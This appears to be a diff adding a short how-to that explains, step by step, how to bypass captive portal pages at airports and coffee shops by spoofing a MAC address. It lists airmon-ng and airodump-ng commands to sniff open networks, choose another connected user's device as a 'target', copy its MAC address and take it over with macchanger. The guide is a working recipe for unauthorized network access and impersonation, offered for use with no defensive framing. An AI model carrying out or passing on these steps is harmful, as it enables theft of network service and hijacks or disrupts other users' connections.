@@ -1,0 +1,37 @@
+Spoofing MAC Address to get past Captive Portal Pages (Airport wifi, coffee shop wifi)
+
+Put Network Interface into monitor mode
+
+sudo airmon-ng start [Interface Name]
+
+Do not turn off other services unless necessary
+
+Scan area for open networks and filter for encryption types. Use Ctrl + C to stop scanning
+
+sudo airodump-ng [Interface Name] --encrypt OPN
+
+Choose your network and identify it's channel
+
+Filter by that channel
+
+sudo airodump-ng [Interface Name]  -c [Channel Number] -encrypt OPN -a
+
+Select a target, preferably the one sending the most frames, and copy the MAC address
+
+Take Network Interface out of monitor mode
+
+sudo airmon-ng stop [Interface Name]
+
+Bring the Network Interface down
+
+sudo ifconfig [Interface Name] down
+
+Use MAC Changer to change MAC address
+
+sudo macchanger -m [New MAC Address] [Interface Name]
+
+Bring the Network Interface back up
+
+sudo ifconfig  [Interface Name] up
+
+
